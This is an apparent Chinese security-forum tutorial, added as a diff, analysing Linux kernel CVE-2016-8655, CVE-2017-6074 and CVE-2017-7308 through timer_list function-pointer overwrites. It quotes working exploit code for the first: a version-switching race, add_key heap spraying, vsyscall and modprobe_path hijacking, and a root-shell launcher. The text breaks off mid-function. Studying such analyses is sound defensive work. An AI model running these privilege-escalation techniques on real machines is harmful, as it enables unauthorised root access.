@@ -1,0 +1,480 @@
+<div class="detail_content markdown-body editormd-preview-container" id="markdown-body">
+<div id="app">
+<h2 data-content="1" id="ec08f86d82713ffd2cf52e5326cb0d5c">前言</h2>
+<p>CVE-2016-8655/CVE-2017-6074/CVE-2017-7308都是linux内核中与网络协议有关的漏洞，并且EXP都采用了覆盖timer_list结构体中函数的方法，本文试图通过分析这几个漏洞和读者一起学习。<br/>
+linux内核使用timer_list结构体做为定时器。</p>
+<div class="highlight"><pre><span></span><span class="k">struct</span> <span class="n">timer_list</span> <span class="p">{</span>
+    <span class="cm">/*</span>
+<span class="cm">     * All fields that change during normal runtime grouped to the</span>
+<span class="cm">     * same cacheline</span>
+<span class="cm">     */</span>
+    <span class="k">struct</span> <span class="n">hlist_node</span>   <span class="n">entry</span><span class="p">;</span>
+    <span class="kt">unsigned</span> <span class="kt">long</span>       <span class="n">expires</span><span class="p">;</span>
+    <span class="kt">void</span>            <span class="p">(</span><span class="o">*</span><span class="n">function</span><span class="p">)(</span><span class="kt">unsigned</span> <span class="kt">long</span><span class="p">);</span>
+    <span class="kt">unsigned</span> <span class="kt">long</span>       <span class="n">data</span><span class="p">;</span>
+    <span class="n">u32</span>         <span class="n">flags</span><span class="p">;</span>
+    <span class="kt">int</span>         <span class="n">slack</span><span class="p">;</span>
+
+<span class="cp">#ifdef CONFIG_TIMER_STATS</span>
+    <span class="kt">int</span>         <span class="n">start_pid</span><span class="p">;</span>
+    <span class="kt">void</span>            <span class="o">*</span><span class="n">start_site</span><span class="p">;</span>
+    <span class="kt">char</span>            <span class="n">start_comm</span><span class="p">[</span><span class="mi">16</span><span class="p">];</span>
+<span class="cp">#endif</span>
+<span class="cp">#ifdef CONFIG_LOCKDEP</span>
+    <span class="k">struct</span> <span class="n">lockdep_map</span>  <span class="n">lockdep_map</span><span class="p">;</span>
+<span class="cp">#endif</span>
+<span class="p">};</span>
+</pre></div>
+<p>我们重点关注前几个成员：entry是定时器链表的入口，expires是定时器到期时间，function是定时器处理函数，data是传给定时器处理函数的参数。定时器到期时，function就会被执行。下面我们就来看看这个结构体在内核漏洞利用中的使用。</p>
+<h2 data-content="1" id="88cda206b119aa453d69c8492eaf33ce">内核调试方法</h2>
+<p>有下面几种常用的内核调试方法可供选择，都有比较详细的文章。<br/>
+1.自己编译内核使用qemu+busybox调试<br/>
+2.使用virtualbox/vmware搭建两台虚拟机用串口通信调试<br/>
+3.使用vmware提供的gdb stub调试<br/>
+不过最后一种方法需要物理机也是linux系统。使用virtualbox用串口通信调试的设置和vmware略有不同，host和target的设置如下。<br/>
+<img src="https://xzfile.aliyuncs.com/media/upload/picture/20181128155101-597c2a22-f2e2-1.png"/><br/>
+<img src="https://xzfile.aliyuncs.com/media/upload/picture/20181128155118-63b643ce-f2e2-1.png"/><br/>
+先启动target再启动host。</p>
+<h2 data-content="1" id="c0b2e40af653e4d0bdbda6723720843b">CVE-2016-8655</h2>
+<p>关于这个漏洞已经有比较详细分析了[4]，下面和大家一起学习一下。<br/>
+packet_set_ring函数在创建ringbuffer的时候，如果packet版本为TPACKET_V3会初始化定时器。</p>
+<div class="highlight"><pre><span></span><span class="k">case</span> <span class="nl">TPACKET_V3</span><span class="p">:</span>
+        <span class="cm">/* Transmit path is not supported. We checked</span>
+<span class="cm">         * it above but just being paranoid</span>
+<span class="cm">         */</span>
+            <span class="k">if</span> <span class="p">(</span><span class="o">!</span><span class="n">tx_ring</span><span class="p">)</span>
+                <span class="n">init_prb_bdqc</span><span class="p">(</span><span class="n">po</span><span class="p">,</span> <span class="n">rb</span><span class="p">,</span> <span class="n">pg_vec</span><span class="p">,</span> <span class="n">req_u</span><span class="p">);</span>
+            <span class="k">break</span><span class="p">;</span>
+        <span class="k">default</span><span class="o">:</span>
+            <span class="k">break</span><span class="p">;</span>
+</pre></div>
+<p>调用路径：packet_set_ring()-&gt;init_prb_bdqc()-&gt;prb_setup_retire_blk_timer()-&gt;prb_init_blk_timer()-&gt;init_timer()。<br/>
+关闭socket时会再次调用packet_set_ring函数，如果packet的版本大于TPACKET_V2，内核会在队列中注销掉先前的定时器。</p>
+<div class="highlight"><pre><span></span><span class="k">if</span> <span class="p">(</span><span class="n">closing</span> <span class="o">&amp;&amp;</span> <span class="p">(</span><span class="n">po</span><span class="o">-&gt;</span><span class="n">tp_version</span> <span class="o">&gt;</span> <span class="n">TPACKET_V2</span><span class="p">))</span> <span class="p">{</span>
+        <span class="cm">/* Because we don't support block-based V3 on tx-ring */</span>
+        <span class="k">if</span> <span class="p">(</span><span class="o">!</span><span class="n">tx_ring</span><span class="p">)</span>
+            <span class="n">prb_shutdown_retire_blk_timer</span><span class="p">(</span><span class="n">po</span><span class="p">,</span> <span class="n">rb_queue</span><span class="p">);</span>
+    <span class="p">}</span>
+</pre></div>
+<p>调用路径：packet_set_ring()-&gt;prb_shutdown_retire_blk_timer()-&gt;prb_del_retire_blk_timer()-&gt;del_timer_sync()-&gt;del_timer()。<br/>
+但是中间这段时间如果其它线程调用setsockopt将packet设为TPACKET_V1，前面初始化的定时器就不会在内核队列中注销，过期时就会触发定时器中回调函数的执行。这样，在timer_list结构体上就形成了UAF，可以使用堆喷射的方法把function替换为我们想要执行的函数。EXP中触发漏洞的代码如下。</p>
+<div class="highlight"><pre><span></span><span class="kt">void</span> <span class="o">*</span><span class="nf">vers_switcher</span><span class="p">(</span><span class="kt">void</span> <span class="o">*</span><span class="n">arg</span><span class="p">)</span>
+<span class="p">{</span>
+    <span class="kt">int</span> <span class="n">val</span><span class="p">,</span><span class="n">x</span><span class="p">,</span><span class="n">y</span><span class="p">;</span>
+
+    <span class="k">while</span><span class="p">(</span><span class="n">barrier</span><span class="p">)</span> <span class="p">{}</span>
+
+    <span class="k">while</span><span class="p">(</span><span class="mi">1</span><span class="p">)</span> <span class="p">{</span>
+        <span class="n">val</span> <span class="o">=</span> <span class="n">TPACKET_V1</span><span class="p">;</span>
+        <span class="n">x</span> <span class="o">=</span> <span class="n">setsockopt</span><span class="p">(</span><span class="n">sfd</span><span class="p">,</span> <span class="n">SOL_PACKET</span><span class="p">,</span> <span class="n">PACKET_VERSION</span><span class="p">,</span> <span class="o">&amp;</span><span class="n">val</span><span class="p">,</span> <span class="k">sizeof</span><span class="p">(</span><span class="n">val</span><span class="p">));</span>
+
+        <span class="n">y</span><span class="o">++</span><span class="p">;</span>
+
+        <span class="k">if</span><span class="p">(</span><span class="n">x</span> <span class="o">!=</span> <span class="mi">0</span><span class="p">)</span> <span class="k">break</span><span class="p">;</span>
+
+        <span class="n">val</span> <span class="o">=</span> <span class="n">TPACKET_V3</span><span class="p">;</span>
+        <span class="n">x</span> <span class="o">=</span> <span class="n">setsockopt</span><span class="p">(</span><span class="n">sfd</span><span class="p">,</span> <span class="n">SOL_PACKET</span><span class="p">,</span> <span class="n">PACKET_VERSION</span><span class="p">,</span> <span class="o">&amp;</span><span class="n">val</span><span class="p">,</span> <span class="k">sizeof</span><span class="p">(</span><span class="n">val</span><span class="p">));</span>
+
+        <span class="k">if</span><span class="p">(</span><span class="n">x</span> <span class="o">!=</span> <span class="mi">0</span><span class="p">)</span> <span class="k">break</span><span class="p">;</span>
+
+        <span class="n">y</span><span class="o">++</span><span class="p">;</span>
+    <span class="p">}</span>
+
+    <span class="n">fprintf</span><span class="p">(</span><span class="n">stderr</span><span class="p">,</span><span class="s">"version switcher stopping, x = %d (y = %d, last val = %d)</span><span class="se">\n</span><span class="s">"</span><span class="p">,</span><span class="n">x</span><span class="p">,</span><span class="n">y</span><span class="p">,</span><span class="n">val</span><span class="p">);</span>
+    <span class="n">vers_switcher_done</span> <span class="o">=</span> <span class="mi">1</span><span class="p">;</span>
+
+
+    <span class="k">return</span> <span class="nb">NULL</span><span class="p">;</span>
+<span class="p">}</span>
+</pre></div>
+<p>具体喷射用的是add_key函数。</p>
+<div class="highlight"><pre><span></span><span class="cp">#define BUFSIZE 1408</span>
+<span class="kt">char</span> <span class="n">exploitbuf</span><span class="p">[</span><span class="n">BUFSIZE</span><span class="p">];</span>
+
+<span class="kt">void</span> <span class="nf">kmalloc</span><span class="p">(</span><span class="kt">void</span><span class="p">)</span>
+<span class="p">{</span>
+    <span class="k">while</span><span class="p">(</span><span class="mi">1</span><span class="p">)</span>
+        <span class="n">syscall</span><span class="p">(</span><span class="n">__NR_add_key</span><span class="p">,</span> <span class="s">"user"</span><span class="p">,</span><span class="s">"wtf"</span><span class="p">,</span><span class="n">exploitbuf</span><span class="p">,</span><span class="n">BUFSIZE</span><span class="o">-</span><span class="mi">24</span><span class="p">,</span><span class="o">-</span><span class="mi">2</span><span class="p">);</span>
+<span class="p">}</span>
+</pre></div>
+<p>这里的exploitbuf是1408个字节但是指定的长度是1408-24个字节，因为在add_key函数中会调用到user_preparse函数，它会先创建大小为24字节的user_key_payload结构体。</p>
+<div class="highlight"><pre><span></span><span class="cm">/*</span>
+<span class="cm"> * Preparse a user defined key payload</span>
+<span class="cm"> */</span>
+<span class="kt">int</span> <span class="nf">user_preparse</span><span class="p">(</span><span class="k">struct</span> <span class="n">key_preparsed_payload</span> <span class="o">*</span><span class="n">prep</span><span class="p">)</span>
+<span class="p">{</span>
+    <span class="k">struct</span> <span class="n">user_key_payload</span> <span class="o">*</span><span class="n">upayload</span><span class="p">;</span>
+    <span class="kt">size_t</span> <span class="n">datalen</span> <span class="o">=</span> <span class="n">prep</span><span class="o">-&gt;</span><span class="n">datalen</span><span class="p">;</span>
+
+    <span class="k">if</span> <span class="p">(</span><span class="n">datalen</span> <span class="o">&lt;=</span> <span class="mi">0</span> <span class="o">||</span> <span class="n">datalen</span> <span class="o">&gt;</span> <span class="mi">32767</span> <span class="o">||</span> <span class="o">!</span><span class="n">prep</span><span class="o">-&gt;</span><span class="n">data</span><span class="p">)</span>
+        <span class="k">return</span> <span class="o">-</span><span class="n">EINVAL</span><span class="p">;</span>
+
+    <span class="n">upayload</span> <span class="o">=</span> <span class="n">kmalloc</span><span class="p">(</span><span class="k">sizeof</span><span class="p">(</span><span class="o">*</span><span class="n">upayload</span><span class="p">)</span> <span class="o">+</span> <span class="n">datalen</span><span class="p">,</span> <span class="n">GFP_KERNEL</span><span class="p">);</span>
+    <span class="k">if</span> <span class="p">(</span><span class="o">!</span><span class="n">upayload</span><span class="p">)</span>
+        <span class="k">return</span> <span class="o">-</span><span class="n">ENOMEM</span><span class="p">;</span>
+
+    <span class="cm">/* attach the data */</span>
+    <span class="n">prep</span><span class="o">-&gt;</span><span class="n">quotalen</span> <span class="o">=</span> <span class="n">datalen</span><span class="p">;</span>
+    <span class="n">prep</span><span class="o">-&gt;</span><span class="n">payload</span><span class="p">.</span><span class="n">data</span><span class="p">[</span><span class="mi">0</span><span class="p">]</span> <span class="o">=</span> <span class="n">upayload</span><span class="p">;</span>
+    <span class="n">upayload</span><span class="o">-&gt;</span><span class="n">datalen</span> <span class="o">=</span> <span class="n">datalen</span><span class="p">;</span>
+    <span class="n">memcpy</span><span class="p">(</span><span class="n">upayload</span><span class="o">-&gt;</span><span class="n">data</span><span class="p">,</span> <span class="n">prep</span><span class="o">-&gt;</span><span class="n">data</span><span class="p">,</span> <span class="n">datalen</span><span class="p">);</span>
+    <span class="k">return</span> <span class="mi">0</span><span class="p">;</span>
+<span class="p">}</span>
+<span class="n">EXPORT_SYMBOL_GPL</span><span class="p">(</span><span class="n">user_preparse</span><span class="p">);</span>
+</pre></div>
+<p>timer_list结构体相对于exploitbuf的偏移是0x35E个字节，因为data在user_key_payload结构体中的偏移是0x12个字节， 而timer_list结构体在packet_sock结构体中的偏移是0x370个字节(0x35E+0x12=0x370)。</p>
+<div class="highlight"><pre><span></span><span class="k">struct</span> <span class="n">user_key_payload</span> <span class="p">{</span>
+    <span class="k">struct</span> <span class="n">rcu_head</span> <span class="n">rcu</span><span class="p">;</span>        <span class="cm">/* RCU destructor */</span>
+    <span class="kt">unsigned</span> <span class="kt">short</span>  <span class="n">datalen</span><span class="p">;</span>    <span class="cm">/* length of this data */</span>
+    <span class="kt">char</span>        <span class="n">data</span><span class="p">[</span><span class="mi">0</span><span class="p">];</span>    <span class="cm">/* actual data */</span>
+<span class="p">};</span>
+</pre></div>
+<p><img src="https://xzfile.aliyuncs.com/media/upload/picture/20181126143649-a75216ec-f145-1.jpg"/><br/>
+第一次触发漏洞，通过调用set_memory_rw函数将vsyscall页设置成可写属性页。<br/>
+<img src="https://xzfile.aliyuncs.com/media/upload/picture/20181126102412-5d2ccada-f122-1.png"/><br/>
+<img src="https://xzfile.aliyuncs.com/media/upload/picture/20181126102654-bd93a600-f122-1.jpg"/><br/>
+<img src="https://xzfile.aliyuncs.com/media/upload/picture/20181126144415-b0d263f6-f146-1.jpg"/><br/>
+然后再修改vsyscall页内容为构造的ctl_table结构体的数据，将data设置为moprobe_path(/sbin/modprobe)。</p>
+<div class="highlight"><pre><span></span><span class="kt">void</span> <span class="nf">wrapper</span><span class="p">(</span><span class="kt">void</span><span class="p">)</span>
+<span class="p">{</span>
+    <span class="k">struct</span> <span class="n">ctl_table</span> <span class="o">*</span><span class="n">c</span><span class="p">;</span>
+
+    <span class="n">fprintf</span><span class="p">(</span><span class="n">stderr</span><span class="p">,</span><span class="s">"exploit starting</span><span class="se">\n</span><span class="s">"</span><span class="p">);</span>
+    <span class="n">printf</span><span class="p">(</span><span class="s">"making vsyscall page writable..</span><span class="se">\n\n</span><span class="s">"</span><span class="p">);</span>
+
+    <span class="n">exploit</span><span class="p">(</span><span class="n">off</span><span class="o">-&gt;</span><span class="n">set_memory_rw</span><span class="p">,</span> <span class="n">VSYSCALL</span><span class="p">,</span> <span class="n">verify_stage1</span><span class="p">);</span>
+
+    <span class="n">printf</span><span class="p">(</span><span class="s">"</span><span class="se">\n</span><span class="s">stage 1 completed</span><span class="se">\n</span><span class="s">"</span><span class="p">);</span>
+
+    <span class="n">sleep</span><span class="p">(</span><span class="mi">5</span><span class="p">);</span>
+
+    <span class="n">printf</span><span class="p">(</span><span class="s">"registering new sysctl..</span><span class="se">\n\n</span><span class="s">"</span><span class="p">);</span>
+
+    <span class="n">c</span> <span class="o">=</span> <span class="p">(</span><span class="k">struct</span> <span class="n">ctl_table</span> <span class="o">*</span><span class="p">)(</span><span class="n">VSYSCALL</span><span class="o">+</span><span class="mh">0x850</span><span class="p">);</span>
+
+    <span class="n">memset</span><span class="p">((</span><span class="kt">char</span> <span class="o">*</span><span class="p">)(</span><span class="n">VSYSCALL</span><span class="o">+</span><span class="mh">0x850</span><span class="p">),</span> <span class="sc">'\x00'</span><span class="p">,</span> <span class="mi">1952</span><span class="p">);</span>
+
+    <span class="n">strcpy</span><span class="p">((</span><span class="kt">char</span> <span class="o">*</span><span class="p">)(</span><span class="n">VSYSCALL</span><span class="o">+</span><span class="mh">0xf00</span><span class="p">),</span><span class="s">"hack"</span><span class="p">);</span>
+    <span class="n">memcpy</span><span class="p">((</span><span class="kt">char</span> <span class="o">*</span><span class="p">)(</span><span class="n">VSYSCALL</span><span class="o">+</span><span class="mh">0xe00</span><span class="p">),</span><span class="s">"</span><span class="se">\x01\x00\x00\x00</span><span class="s">"</span><span class="p">,</span><span class="mi">4</span><span class="p">);</span>
+    <span class="n">c</span><span class="o">-&gt;</span><span class="n">procname</span> <span class="o">=</span> <span class="p">(</span><span class="kt">char</span> <span class="o">*</span><span class="p">)(</span><span class="n">VSYSCALL</span><span class="o">+</span><span class="mh">0xf00</span><span class="p">);</span>
+    <span class="n">c</span><span class="o">-&gt;</span><span class="n">mode</span> <span class="o">=</span> <span class="mo">0666</span><span class="p">;</span>
+    <span class="n">c</span><span class="o">-&gt;</span><span class="n">proc_handler</span> <span class="o">=</span> <span class="p">(</span><span class="kt">void</span> <span class="o">*</span><span class="p">)(</span><span class="n">off</span><span class="o">-&gt;</span><span class="n">proc_dostring</span><span class="p">);</span>
+    <span class="n">c</span><span class="o">-&gt;</span><span class="n">data</span> <span class="o">=</span> <span class="p">(</span><span class="kt">void</span> <span class="o">*</span><span class="p">)(</span><span class="n">off</span><span class="o">-&gt;</span><span class="n">modprobe_path</span><span class="p">);</span>
+    <span class="n">c</span><span class="o">-&gt;</span><span class="n">maxlen</span><span class="o">=</span><span class="mi">256</span><span class="p">;</span>
+    <span class="n">c</span><span class="o">-&gt;</span><span class="n">extra1</span> <span class="o">=</span> <span class="p">(</span><span class="kt">void</span> <span class="o">*</span><span class="p">)(</span><span class="n">VSYSCALL</span><span class="o">+</span><span class="mh">0xe00</span><span class="p">);</span>
+    <span class="n">c</span><span class="o">-&gt;</span><span class="n">extra2</span> <span class="o">=</span> <span class="p">(</span><span class="kt">void</span> <span class="o">*</span><span class="p">)(</span><span class="n">VSYSCALL</span><span class="o">+</span><span class="mh">0xd00</span><span class="p">);</span>
+
+    <span class="n">exploit</span><span class="p">(</span><span class="n">off</span><span class="o">-&gt;</span><span class="n">register_sysctl_table</span><span class="p">,</span> <span class="n">VSYSCALL</span><span class="o">+</span><span class="mh">0x850</span><span class="p">,</span> <span class="n">verify_stage2</span><span class="p">);</span>
+
+    <span class="n">printf</span><span class="p">(</span><span class="s">"stage 2 completed</span><span class="se">\n</span><span class="s">"</span><span class="p">);</span>
+<span class="p">}</span>
+</pre></div>
+<p>第二次触发漏洞，通过调用register_sysctl_table函数注册构造的ctl_table结构体对应的sysctl条目。<br/>
+<img src="https://xzfile.aliyuncs.com/media/upload/picture/20181126144741-2bf4b052-f147-1.jpg"/><br/>
+<img src="https://xzfile.aliyuncs.com/media/upload/picture/20181126144829-486b298c-f147-1.jpg"/><br/>
+<img src="https://xzfile.aliyuncs.com/media/upload/picture/20181126144910-60be5680-f147-1.jpg"/><br/>
+然后再把/proc/sys/hack改成当前程序的路径，调用socket函数引用未被内核加载的网络驱动模块，内核会依次调用：inet_create -&gt; request_module -&gt; call_modprobe -&gt; call_usermodehelper_setup&amp;call_usermodehelper_exec -&gt; call_usermodehelper_exec_work -&gt; call_usermodehelper_exec_async -&gt; do_execve。<br/>
+在call_usermodehelper_exec_async中调用do_execve之前会调用commit_creds(prepare_kernel_cred(0))。而call_modprobe中指定的modprobe_path是/sbin/modprobe，被替换成了poc程序的绝对路径，于是poc程序就以root权限运行了。这种方法是在[6]中提出的。<br/>
+<img src="https://xzfile.aliyuncs.com/media/upload/picture/20181126150010-ea3a22e4-f148-1.jpg"/></p>
+<div class="highlight"><pre><span></span><span class="kt">void</span> <span class="nf">launch_rootshell</span><span class="p">(</span><span class="kt">void</span><span class="p">)</span>
+<span class="p">{</span>
+    <span class="kt">int</span> <span class="n">fd</span><span class="p">;</span>
+    <span class="kt">char</span> <span class="n">buf</span><span class="p">[</span><span class="mi">256</span><span class="p">];</span>
+    <span class="k">struct</span> <span class="n">stat</span> <span class="n">s</span><span class="p">;</span>
+
+
+    <span class="n">fd</span> <span class="o">=</span> <span class="n">open</span><span class="p">(</span><span class="s">"/proc/sys/hack"</span><span class="p">,</span><span class="n">O_WRONLY</span><span class="p">);</span>
+
+    <span class="k">if</span><span class="p">(</span><span class="n">fd</span> <span class="o">==</span> <span class="o">-</span><span class="mi">1</span><span class="p">)</span> <span class="p">{</span>
+        <span class="n">fprintf</span><span class="p">(</span><span class="n">stderr</span><span class="p">,</span><span class="s">"could not open /proc/sys/hack</span><span class="se">\n</span><span class="s">"</span><span class="p">);</span>
+        <span class="n">exit</span><span class="p">(</span><span class="o">-</span><span class="mi">1</span><span class="p">);</span>
+    <span class="p">}</span>
+
+    <span class="n">memset</span><span class="p">(</span><span class="n">buf</span><span class="p">,</span><span class="sc">'\x00'</span><span class="p">,</span> <span class="mi">256</span><span class="p">);</span>
+
+    <span class="n">readlink</span><span class="p">(</span><span class="s">"/proc/self/exe"</span><span class="p">,(</span><span class="kt">char</span> <span class="o">*</span><span class="p">)</span><span class="o">&amp;</span><span class="n">buf</span><span class="p">,</span><span class="mi">256</span><span class="p">);</span>
+
+    <span class="n">write</span><span class="p">(</span><span class="n">fd</span><span class="p">,</span><span class="n">buf</span><span class="p">,</span><span class="n">strlen</span><span class="p">(</span><span class="n">buf</span><span class="p">)</span><span class="o">+</span><span class="mi">1</span><span class="p">);</span>
+
+    <span class="n">socket</span><span class="p">(</span><span class="n">AF_INET</span><span class="p">,</span><span class="n">SOCK_STREAM</span><span class="p">,</span><span class="mi">132</span><span class="p">);</span>
+
+    <span class="k">if</span><span class="p">(</span><span class="n">stat</span><span class="p">(</span><span class="n">buf</span><span class="p">,</span><span class="o">&amp;</span><span class="n">s</span><span class="p">)</span> <span class="o">==</span> <span class="mi">0</span> <span class="o">&amp;&amp;</span> <span class="n">s</span><span class="p">.</span><span class="n">st_uid</span> <span class="o">==</span> <span class="mi">0</span><span class="p">)</span> <span class="p">{</span>
+        <span class="n">printf</span><span class="p">(</span><span class="s">"binary executed by kernel, launching rootshell</span><span class="se">\n</span><span class="s">"</span><span class="p">);</span>
+        <span class="n">lseek</span><span class="p">(</span><span class="n">fd</span><span class="p">,</span> <span class="mi">0</span><span class="p">,</span> <span class="n">SEEK_SET</span><span class="p">);</span>
+        <span class="n">write</span><span class="p">(</span><span class="n">fd</span><span class="p">,</span><span class="s">"/sbin/modprobe"</span><span class="p">,</span><span class="mi">15</span><span class="p">);</span>
+        <span class="n">close</span><span class="p">(</span><span class="n">fd</span><span class="p">);</span>
+        <span class="n">execl</span><span class="p">(</span><span class="n">buf</span><span class="p">,</span><span class="n">buf</span><span class="p">,</span><span class="nb">NULL</span><span class="p">);</span>
+    <span class="p">}</span>
+
+    <span class="k">else</span>
+        <span class="n">printf</span><span class="p">(</span><span class="s">"could not create rootshell</span><span class="se">\n</span><span class="s">"</span><span class="p">);</span>
+
+
+<span class="p">}</span>
+</pre></div>
+<h2 data-content="1" id="1c31024fdd7b5e296d03700364411c83">CVE-2017-6074</h2>
+<p>在dccp_rcv_state_process函数中，如果dccp_v6_conn_request函数成功返回就会调用__kfree_skb函数强制释放skb。</p>
+<div class="highlight"><pre><span></span><span class="k">if</span> <span class="p">(</span><span class="n">sk</span><span class="o">-&gt;</span><span class="n">sk_state</span> <span class="o">==</span> <span class="n">DCCP_LISTEN</span><span class="p">)</span> <span class="p">{</span>
+        <span class="k">if</span> <span class="p">(</span><span class="n">dh</span><span class="o">-&gt;</span><span class="n">dccph_type</span> <span class="o">==</span> <span class="n">DCCP_PKT_REQUEST</span><span class="p">)</span> <span class="p">{</span>
+            <span class="k">if</span> <span class="p">(</span><span class="n">inet_csk</span><span class="p">(</span><span class="n">sk</span><span class="p">)</span><span class="o">-&gt;</span><span class="n">icsk_af_ops</span><span class="o">-&gt;</span><span class="n">conn_request</span><span class="p">(</span><span class="n">sk</span><span class="p">,</span>
+                                    <span class="n">skb</span><span class="p">)</span> <span class="o">&lt;</span> <span class="mi">0</span><span class="p">)</span>
+                <span class="k">return</span> <span class="mi">1</span><span class="p">;</span>
+            <span class="k">goto</span> <span class="n">discard</span><span class="p">;</span>
+<span class="p">......</span>
+<span class="nl">discard</span><span class="p">:</span>
+        <span class="n">__kfree_skb</span><span class="p">(</span><span class="n">skb</span><span class="p">);</span>
+    <span class="p">}</span>
+    <span class="k">return</span> <span class="mi">0</span><span class="p">;</span>
+<span class="p">}</span>
+
+<span class="n">EXPORT_SYMBOL_GPL</span><span class="p">(</span><span class="n">dccp_rcv_state_process</span><span class="p">);</span>
+</pre></div>
+<p>如果socket设置了IPV6_RECVPKTINFO则skb被保存到ireq-&gt;pktopts并且引用计数+1。然而，dccp_rcv_state_process函数仍然会把skb释放掉，造成了UAF。</p>
+<div class="highlight"><pre><span></span><span class="k">if</span> <span class="p">(</span><span class="n">ipv6_opt_accepted</span><span class="p">(</span><span class="n">sk</span><span class="p">,</span> <span class="n">skb</span><span class="p">,</span> <span class="n">IP6CB</span><span class="p">(</span><span class="n">skb</span><span class="p">))</span> <span class="o">||</span>
+        <span class="n">np</span><span class="o">-&gt;</span><span class="n">rxopt</span><span class="p">.</span><span class="n">bits</span><span class="p">.</span><span class="n">rxinfo</span> <span class="o">||</span> <span class="n">np</span><span class="o">-&gt;</span><span class="n">rxopt</span><span class="p">.</span><span class="n">bits</span><span class="p">.</span><span class="n">rxoinfo</span> <span class="o">||</span>
+        <span class="n">np</span><span class="o">-&gt;</span><span class="n">rxopt</span><span class="p">.</span><span class="n">bits</span><span class="p">.</span><span class="n">rxhlim</span> <span class="o">||</span> <span class="n">np</span><span class="o">-&gt;</span><span class="n">rxopt</span><span class="p">.</span><span class="n">bits</span><span class="p">.</span><span class="n">rxohlim</span><span class="p">)</span> <span class="p">{</span>
+        <span class="n">atomic_inc</span><span class="p">(</span><span class="o">&amp;</span><span class="n">skb</span><span class="o">-&gt;</span><span class="n">users</span><span class="p">);</span>
+        <span class="n">ireq</span><span class="o">-&gt;</span><span class="n">pktopts</span> <span class="o">=</span> <span class="n">skb</span><span class="p">;</span>
+</pre></div>
+<p>我们可以使用同样的方法利用这个漏洞，这一次把timer_list结构体中的function替换为native_write_cr4禁用SMEP&amp;SMAP。<br/>
+<img src="https://xzfile.aliyuncs.com/media/upload/picture/20181126175853-e1c244c0-f161-1.jpg"/><br/>
+<img src="https://xzfile.aliyuncs.com/media/upload/picture/20181126175953-05ae2ef8-f162-1.jpg"/><br/>
+然后通过覆盖skb_shared_info结构体中的函数指针使得在释放skb时执行被替换后的用户态中的提权函数。<br/>
+<img src="https://xzfile.aliyuncs.com/media/upload/picture/20181128101340-38e06b7c-f2b3-1.bmp"/></p>
+<h2 data-content="1" id="747cd81f00105f10dbf3928f81ab6d22">CVE-2017-7308</h2>
+<p>Project Zero的一篇文章中描述了这个漏洞从发现到利用的全部过程[5]，下面和大家一起学习一下。<br/>
+packet_set_ring函数中存在一处整数溢出。</p>
+<div class="highlight"><pre><span></span><span class="k">if</span> <span class="p">(</span><span class="n">po</span><span class="o">-&gt;</span><span class="n">tp_version</span> <span class="o">&gt;=</span> <span class="n">TPACKET_V3</span> <span class="o">&amp;&amp;</span>
+            <span class="p">(</span><span class="kt">int</span><span class="p">)(</span><span class="n">req</span><span class="o">-&gt;</span><span class="n">tp_block_size</span> <span class="o">-</span>
+              <span class="n">BLK_PLUS_PRIV</span><span class="p">(</span><span class="n">req_u</span><span class="o">-&gt;</span><span class="n">req3</span><span class="p">.</span><span class="n">tp_sizeof_priv</span><span class="p">))</span> <span class="o">&lt;=</span> <span class="mi">0</span><span class="p">)</span>
+            <span class="k">goto</span> <span class="n">out</span><span class="p">;</span>
+</pre></div>
+<p>这个检查过程的目的是确保内存块头部加上每个内存块私有数据的大小不超过内存块自身的大小。然而，这个检查是可以绕过的。</p>
+<pre><code>A = req-&gt;tp_block_size = 4096 = 0x1000
+B = req_u-&gt;req3.tp_sizeof_priv = (1 &lt;&lt; 31) + 4096 = 0x80001000
+BLK_PLUS_PRIV(B) = (1 &lt;&lt; 31) + 4096 + 48 = 0x80001030
+A - BLK_PLUS_PRIV(B) = 0x1000 - 0x80001030 = 0x7fffffd0
+(int)0x7fffffd0 = 0x7fffffd0 &gt; 0</code></pre>
+<p>在调试器中观察一下。<br/>
+<img src="https://xzfile.aliyuncs.com/media/upload/picture/20181127185254-9821901a-f232-1.png"/><br/>
+<img src="https://xzfile.aliyuncs.com/media/upload/picture/20181127185304-9da8a94c-f232-1.png"/><br/>
+之前在CVE-2016-8655中我们说到packet_set_ring函数在创建ringbuffer的时候，如果packet版本为TPACKET_V3会初始化定时器。</p>
+<div class="highlight"><pre><span></span><span class="k">case</span> <span class="nl">TPACKET_V3</span><span class="p">:</span>
+        <span class="cm">/* Transmit path is not supported. We checked</span>
+<span class="cm">         * it above but just being paranoid</span>
+<span class="cm">         */</span>
+            <span class="k">if</span> <span class="p">(</span><span class="o">!</span><span class="n">tx_ring</span><span class="p">)</span>
+                <span class="n">init_prb_bdqc</span><span class="p">(</span><span class="n">po</span><span class="p">,</span> <span class="n">rb</span><span class="p">,</span> <span class="n">pg_vec</span><span class="p">,</span> <span class="n">req_u</span><span class="p">);</span>
+            <span class="k">break</span><span class="p">;</span>
+        <span class="k">default</span><span class="o">:</span>
+            <span class="k">break</span><span class="p">;</span>
+</pre></div>
+<p>之后，在init_prb_bdqc函数中req_u-&gt;req3.tp_sizeof_priv会被复制到p1-&gt;blk_sizeof_priv。由于后者的类型是unsigned short，因此可以将其设置为任意值。p1-&gt;blk_sizeof_priv刚被赋值紧接着就会用来设置p1-&gt;max_frame_len变量的值。p1-&gt;max_frame_len的值代表可以保存到内存块中的某个帧大小的最大值。由于我们可以控制p1-&gt;blk_sizeof_priv，我们可以使BLK_PLUS_PRIV(p1-&gt;blk_sizeof_priv)的值大于p1-&gt;kblk_size的值。这样会设置p1-&gt;max_frame_len为一个比内存块的大小更大的值。</p>
+<div class="highlight"><pre><span></span><span class="k">static</span> <span class="kt">void</span> <span class="nf">init_prb_bdqc</span><span class="p">(</span><span class="k">struct</span> <span class="n">packet_sock</span> <span class="o">*</span><span class="n">po</span><span class="p">,</span>
+            <span class="k">struct</span> <span class="n">packet_ring_buffer</span> <span class="o">*</span><span class="n">rb</span><span class="p">,</span>
+            <span class="k">struct</span> <span class="n">pgv</span> <span class="o">*</span><span class="n">pg_vec</span><span class="p">,</span>
+            <span class="k">union</span> <span class="n">tpacket_req_u</span> <span class="o">*</span><span class="n">req_u</span><span class="p">)</span>
+<span class="p">{</span>
+    <span class="k">struct</span> <span class="n">tpacket_kbdq_core</span> <span class="o">*</span><span class="n">p1</span> <span class="o">=</span> <span class="n">GET_PBDQC_FROM_RB</span><span class="p">(</span><span class="n">rb</span><span class="p">);</span>
+    <span class="k">struct</span> <span class="n">tpacket_block_desc</span> <span class="o">*</span><span class="n">pbd</span><span class="p">;</span>
+
